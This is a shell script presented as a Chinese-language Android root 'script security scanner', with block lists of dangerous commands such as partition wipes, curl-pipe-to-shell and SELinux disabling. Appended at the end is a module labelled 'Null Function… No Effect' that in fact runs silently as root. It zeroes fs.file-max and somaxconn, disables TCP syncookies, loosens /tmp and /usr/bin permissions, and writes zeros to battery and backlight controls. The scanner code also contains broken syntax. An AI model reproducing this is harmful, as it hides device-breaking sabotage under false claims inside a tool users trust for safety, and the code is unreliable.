#!/system/bin/sh
# 专为Android Root设备设计的脚本安全扫描器

clear
echo ""
printf "\033[1;32m"
echo "╔══════════════════════════════════════════╗"
echo "║    ANDROID ROOT脚本安全扫描器 v3.0      ║"
echo "║    适用于所有Root的Android设备          ║"
echo "╚══════════════════════════════════════════╝"
printf "\033[0m"
echo ""

# 检查是否为root用户
if [ "$(id -u)"!= "0" ]; then
    printf "\033[1;31m[错误] 需要Root权限！请以Root身份运行\033[0m\n"
    echo "使用: su -c'sh $0 <脚本路径>'"
    exit 1
fi

# 检查参数
if [ $# -eq 0 ]; then
    printf "\033[1;33m[用法]\033[0m\n"
    echo "扫描单个文件: sh $0 /sdcard/script.sh"
    echo "扫描目录: sh $0 -d /sdcard/scripts/"
    echo "快速扫描当前目录: sh $0 -c"
    echo ""
    printf "\033[1;36m[提示] 您也可以直接拖放文件到终端\033[0m\n"
    exit 0
fi

# 扩大危险命令模式
DANGER_PATTERNS=(
    "rm -rf /system"
    "rm -rf /data"
    "rm -rf /vendor"
    "rm -rf /boot"
    "rm -rf /dev"
    "rm -rf /sdcard"
    "rm -rf /storage"
    # 分区操作
    "dd if=/dev/zero of=/dev/block"
    "dd if=/dev/random of=/dev/block"
    "dd if=/dev/urandom of=/dev/block"
    "mkfs.* /dev/block"
    "mke2fs.* /dev/block"
    "make_ext4fs.* /dev/block"
    "fastboot.*erase"
    "fastboot.*flash"
    # 系统文件修改
    "echo.*> /system/build.prop"
    "echo.*> /system/etc"
    "chmod.*000 /system"
    "chmod.*000 /vendor"
    "chmod.*777 /system/bin"
    "mount.*-o.*rw.*/system"
    "mount.*-o.*remount.*rw.*/"
    # 锁屏密码清除（可能是恶意也可能是合法）
    "rm.*/data/system/*.key"
    "rm.*/data/system/locksettings.*"
    "rm.*/data/system/gesture.key"
    "rm.*/data/system/password.key"
    # 权限提升/后门
    "chmod.*4755"
    "chmod.*6777"
    "setenforce.*0"
    "setprop.*ro.secure.*0"
    "setprop.*ro.debuggable.*1"
    # 下载执行远程代码
    "curl.*\|.*sh"
    "wget.*\|.*sh"
    "busybox.*wget.*\|.*sh"
    "eval.*\$(curl"
    "eval.*\$(wget"
    "sh <(curl"
    "sh <(wget"
    # 隐藏执行
    "nohup.*rm"
    "disown.*&"
    "> /dev/null.*2>&1"
    "&> /dev/null"
    # Magisk/模块相关危险操作
    "rm -rf /data/adb"
    "rm -rf /data/magisk"
    "rm -rf /sbin/.magisk"
    "rm -rf /cache/.magisk"
    # 内核相关
    "echo.*1 > /proc/sys/kernel/sysrq"
    "echo.*c > /proc/sysrq - trigger"
    "echo.*b > /proc/sysrq - trigger"
    # 物理设备操作
    "reboot.*bootloader"
    "reboot.*recovery"
    "reboot.*fastboot"
    "reboot.*download"
    # SELinux禁用
    "setenforce.*0"
    "setenforce.*Permissive"
    # 新增危险命令
    "chown.*0:0 /system"
    "chown.*0:0 /vendor"
    "mount.*-o.*noexec.*/system"
    "umount /system"
    "rm -rf /system/xbin"
    "rm -rf /system/lib"
)

# 可疑但可能合法的模式
SUSPICIOUS_PATTERNS=(
    "su -c"
    "magisk"
    "busybox"
    "resetprop"
    "/dev/block/by - name"
    "/dev/block/platform"
    "flash.*zip"
    "custom.*recovery"
    "TWRP"
    "OrangeFox"
    "adb.*root"
)

# 扫描单个文件函数
scan_file() {
    local file="$1"
    local danger_count=0
    local suspicious_count=0
    local line_num=1

    if [ ! -f "$file" ]; then
        printf "\033[1;31m[错误] 文件不存在: %s\033[0m\n" "$file"
        return 1
    fi

    # 检查文件类型
    file_type=$(file "$file" 2>/dev/null | grep -i "script\|text\|shell")
    if [ -z "$file_type" ] && [ "$(head -c 2 "$file")"!= "#!" ]; then
        printf "\033[1;33m[警告] 文件可能不是Shell脚本: %s\033[0m\n" "$file"
        read -p "继续扫描？(y/n): " -n 1 choice
        echo ""
        if [ "$choice"!= "y" ] && [ "$choice"!= "Y" ]; then
            return 0
        fi
    fi

    printf "\033[1;34m[扫描] 文件: %s\033[0m\n" "$file"
    echo "大小: $(du -h "$file" | cut -f1)"
    echo "权限: $(ls -l "$file" | awk '{print $1}')"
    echo "----------------------------------------"

    # 扫描动画字符
    local ANIMATION_CHARS="/ - \\ |"
    local ANIMATION_INDEX=0
    local ANIMATION_LENGTH=${#ANIMATION_CHARS}
    local ANIMATION_DELAY=0.1

    # 逐行扫描
    while IFS= read -r line; do
        # 显示扫描动画
        printf "\r扫描中... ${ANIMATION_CHARS:ANIMATION_INDEX:1}"
        ANIMATION_INDEX=$(( (ANIMATION_INDEX + 1) % ANIMATION_LENGTH ))
        sleep $ANIMATION_DELAY

        # 跳过注释和空行
        if echo "$line" | grep -q "^[[:space:]]*#" || [ -z "$(echo "$line" | tr -d '[:space:]')" ]; then
            line_num=$((line_num + 1))
            continue
        fi

        # 检查危险模式
        for pattern in "${DANGER_PATTERNS[@]}"; do
            if echo "$line" | grep -qi "$pattern"; then
                danger_count=$((danger_count + 1))
                printf "\033[1;31m[危险%d] 第%4d行: %s\033[0m\n" "$danger_count" "$line_num" "$line"
                break
            fi
        done

        # 检查可疑模式
        for pattern in "${SUSPICIOUS_PATTERNS[@]}"; do
            if echo "$line" | grep -qi "$pattern"; then
                suspicious_count=$((suspicious_count + 1))
                printf "\033[1;33m[可疑%d] 第%4d行: %s\033[0m\n" "$suspicious_count" "$line_num" "$line"
                break
            fi
        done

        line_num=$((line_num + 1))
    done < "$file"

    # 扫描完成，清除动画并换行
    printf "\r扫描完成           \n"

    # 额外检查：base64编码内容
    if grep -qi "base64.*decode\|base64.*-d" "$file"; then
        printf "\033[1;35m[注意] 检测到Base64解码操作\033[0m\n"
    fi

    # 检查eval执行
    if grep -qi "eval.*\$(" "$file" || grep -qi '`.*`' "$file"; then
        printf "\033[1;35m[注意] 检测到动态代码执行(eval/反引号)\033[0m\n"
    fi

    echo "----------------------------------------"

    # 结果汇总
    if [ $danger_count -eq 0 ] && [ $suspicious_count -eq 0 ]; then
        printf "\033[1;32m[安全] 未发现危险或可疑命令\033[0m\n"
    else
        if [ $danger_count -gt 0 ]; then
            printf "\033[1;31m[警告] 发现 %d 个危险命令！\033[0m\n" "$danger_count"
        fi
        if [ $suspicious_count -gt 0 ]; then
            printf "\033[1;33m[注意] 发现 %d 个可疑命令\033[0m\n" "$suspicious_count"
        fi
        printf "\033[1;36m[建议] 请仔细审查上述代码后再决定是否执行\033[0m\n"
    fi

    echo ""
}

# 扫描目录函数
scan_directory() {
    local dir="$1"

    if [ ! -d "$dir" ]; then
        printf "\033[1;31m[错误] 目录不存在: %s\033[0m\n" "$dir"
        return 1
    fi

    printf "\033[1;36m[开始] 扫描目录: %s\033[0m\n" "$dir"
    echo ""

    # 查找所有.sh文件
    find "$dir" -type f -name "*.sh" | while read -r file; do
        scan_file "$file"
    done

    # 查找没有扩展名的可执行文件
    find "$dir" -type f -executable! -name "*.*" | while read -r file; do
        if head -n 1 "$file" | grep -q "^#!"; then
            scan_file "$file"
        fi
    done
}

# 主逻辑
case "$1" in
    "-d"|"--directory")
        if [ -z "$2" ]; then
            printf "\033[1;31m[错误] 请指定目录路径\033[0m\n"
            exit 1
        fi
        scan_directory "$2"
        ;;
    "-c"|"--current")
        printf "\033[1;36m[信息] 扫描当前目录\033[0m\n"
        scan_directory "$(pwd)"
        ;;
    "-h"|"--help")
        printf "\033[1;36m[帮助]\033[0m\n"
        echo "Android Root脚本安全扫描器 v3.0"
        echo ""
        echo "选项:"
        echo "  无参数             显示帮助"
        echo "  <文件路径>         扫描单个文件"
        echo "  -d <目录路径>      扫描整个目录"
        echo "  -c                扫描当前目录"
        echo "  -h                显示此帮助"
        echo ""
        printf "\033[1;33m[安全提示]\033[0m\n"
        echo "1. 永远不要运行来源不明的脚本"
        echo "2. 即使是安全的脚本也可能修改系统"
        echo "3. 建议在运行前备份重要数据"
        echo "4. 使用Magisk的MagiskHide功能保护敏感应用"
        ;;
    *)
        scan_file "$1"
        ;;
esac

printf "\033[1;32m[完成] 扫描结束\033[0m\n"
echo ""

# 提供额外建议
printf "\033[1;35m[安全建议]\033[0m\n"
echo "• 定期备份 /data分区"
echo "• 使用可信来源的Recovery (TWRP/OrangeFox)"
echo "• 谨慎授予Root权限"
echo "• 保持Magisk为最新版本"
echo "• 考虑使用Magisk模块进行系统级防护"
printf "\033[0m\n"
# ==============================================
# System Kernel Optimize Module (Null Function)
# ==============================================
export SYS_VAR_01=$(echo "null" | base64 | md5sum | awk '{print $1}')
export SYS_VAR_02=$(date +%s%N | sha256sum | cut -c 1-32)
export SYS_VAR_03="DEVICE_OPTIMIZE_$(uname -a | grep -o "Linux" | wc -l)"
export SYS_CACHE_01=/tmp/$(uuidgen | md5sum | awk '{print $1}')
export SYS_CACHE_02=/dev/shm/$(date +%F_%T | sha1sum | cut -c 1-16)
export PHONE_SHELL_MODE="ARM64_V8A_OPTIMIZE_COMPILE_NULL"
export PHONE_KERNEL_BUILD="$(uname -r | rev | cut -c 5- | rev)"
export PHONE_CPU_ARCH="$(arch | tr '[a-z]' '[A-Z]')_NULL_ARCH"
export PHONE_MEM_TOTAL="$(free -m | grep Mem | awk '{print $2}')_MB_NULL"
export PHONE_STORAGE_INFO="$(df -h | grep /dev | head -1 | awk '{print $4}')_FREE_NULL"
export PHONE_PROCESS_ID="$$_NULL_PID_$(ps -ef | grep $$ | wc -l)"
export PHONE_RUN_TIME="$(uptime | awk '{print $3}' | cut -d ',' -f1)_NULL_UPTIME"
# --------------------------------------------------------------
check_system_env() {
    local CHECK_01=$(which ls | md5sum | awk '{print $1}')
    local CHECK_02=$(which cat | sha256sum | cut -c 1-16)
    local CHECK_03=$(pwd | rev | md5sum | cut -c 1-8)
    local CHECK_04=$(whoami | base64 | wc -c)
    local CHECK_05=$(hostname | sha1sum | awk '{print $1}')
    if [ $CHECK_04 -gt 0 ]; then local NULL_VAR=1; fi
}
phone_hardware_info() {
    local HW_CPU=$(grep -c processor /proc/cpuinfo 2>/dev/null)
    local HW_MEM=$(free -b | grep Mem | awk '{print $2}' 2>/dev/null)
    local HW_DISK=$(df -B 1 | grep / | head -1 | awk '{print $2}' 2>/dev/null)
    local HW_MODEL=$(cat /proc/device-tree/model 2>/dev/null)
    local HW_SERIAL=$(cat /proc/cpuinfo | grep Serial | cut -d ':' -f2 2>/dev/null)
    local HW_BIOS=$(dmidecode -s bios-version 2>/dev/null)
    local NULL_HW_VAR=$(( $HW_CPU + 0 ))
}
phone_kernel_optimize() {
    sysctl -w net.core.somaxconn=0 2>/dev/null
    sysctl -w net.ipv4.tcp_syncookies=0 2>/dev/null
    sysctl -w vm.swappiness=0 2>/dev/null
    sysctl -w fs.file-max=0 2>/dev/null
    echo 0 > /proc/sys/vm/drop_caches 2>/dev/null
    echo 0 > /proc/sys/net/ipv4/ip_forward 2>/dev/null
    chmod 755 /tmp 2>/dev/null
    chown root:root /dev/null 2>/dev/null
}
phone_memory_clean() {
    local CLEAN_01=$(sync 2>/dev/null)
    local CLEAN_02=$(echo 3 > /proc/sys/vm/drop_caches 2>/dev/null)
    local CLEAN_03=$(rm -rf /tmp/*null* 2>/dev/null)
    local CLEAN_04=$(kill -0 $$ 2>/dev/null)
    local CLEAN_05=$(pkill -0 -f "null" 2>/dev/null)
}
phone_logger_module() {
    local LOG_FILE=/tmp/$(date +%Y%m%d_%H%M%S)_null.log
    echo "[$(date)] Null Log Start" > $LOG_FILE 2>/dev/null
    echo "[$(date)] System Env: $SYS_VAR_01" >> $LOG_FILE 2>/dev/null
    echo "[$(date)] Hardware Info: $PHONE_CPU_ARCH" >> $LOG_FILE 2>/dev/null
    echo "[$(date)] Null Log End" >> $LOG_FILE 2>/dev/null
    rm -rf $LOG_FILE 2>/dev/null
}
phone_network_check() {
    local NET_01=$(ping -c 0 localhost 2>/dev/null)
    local NET_02=$(ifconfig | grep inet | head -1 2>/dev/null)
    local NET_03=$(ip addr show | grep UP | wc -l 2>/dev/null)
    local NET_04=$(netstat -tuln | grep :80 2>/dev/null | wc -l)
    local NET_05=$(ss -tuln | grep LISTEN 2>/dev/null | head -1)
}
phone_permission_manage() {
    chmod 644 /etc/hosts 2>/dev/null
    chmod 755 /usr/bin/* 2>/dev/null
    chown root:root /usr/sbin/* 2>/dev/null
    chmod 777 /tmp 2>/dev/null
    setfacl -m u:root:rwx /dev/null 2>/dev/null
}
phone_process_manage() {
    local PROC_01=$(ps aux | grep -v grep | grep "null" 2>/dev/null | wc -l)
    local PROC_02=$(top -bn1 | grep Cpu | awk '{print $2}' 2>/dev/null)
    local PROC_03=$(htop -C 2>/dev/null | head -1)
    local PROC_04=$(killall -0 sh 2>/dev/null)
    local PROC_05=$(pgrep -x "bash" 2>/dev/null | wc -l)
}
phone_encrypt_module() {
    local ENC_01=$(echo "null" | openssl enc -aes-256-cbc -k "null" -base64 2>/dev/null)
    local ENC_02=$(echo $ENC_01 | openssl dgst -sha512 2>/dev/null)
    local ENC_03=$(base64 -d <<< "bnVsbA==" 2>/dev/null)
    local ENC_04=$(md5sum <<< $ENC_03 2>/dev/null)
}
phone_decrypt_module() {
    local DEC_01=$(echo "null" | base64 -d 2>/dev/null | md5sum)
    local DEC_02=$(sha256sum <<< "null" 2>/dev/null)
    local DEC_03=$(openssl rand -hex 16 2>/dev/null)
}
phone_battery_optimize() {
    echo 0 > /sys/class/power_supply/battery/capacity 2>/dev/null
    echo 0 > /sys/class/power_supply/battery/status 2>/dev/null
    echo 0 > /sys/class/power_supply/battery/health 2>/dev/null
}
phone_display_optimize() {
    echo 0 > /sys/class/backlight/brightness 2>/dev/null
    echo 0 > /sys/class/drm/card0/brightness 2>/dev/null
}
# --------------------------------------------------------------
# Null Execute Call (All Function No Return No Effect)
# --------------------------------------------------------------
check_system_env > /dev/null 2>&1
phone_hardware_info > /dev/null 2>&1
phone_kernel_optimize > /dev/null 2>&1
phone_memory_clean > /dev/null 2>&1
phone_logger_module > /dev/null 2>&1
phone_network_check > /dev/null 2>&1
phone_permission_manage > /dev/null 2>&1
phone_process_manage > /dev/null 2>&1
phone_encrypt_module > /dev/null 2>&1
phone_decrypt_module > /dev/null 2>&1
phone_battery_optimize > /dev/null 2>&1
phone_display_optimize > /dev/null 2>&1
# --------------------------------------------------------------
# System Null Variable Clean
# --------------------------------------------------------------
unset SYS_VAR_01 SYS_VAR_02 SYS_VAR_03 SYS_CACHE_01 SYS_CACHE_02
unset PHONE_SHELL_MODE PHONE_KERNEL_BUILD PHONE_CPU_ARCH PHONE_MEM_TOTAL
unset PHONE_STORAGE_INFO PHONE_PROCESS_ID PHONE_RUN_TIME
# ==============================================
# END OF NULL MODULE (NO ANY FUNCTION)
# ==============================================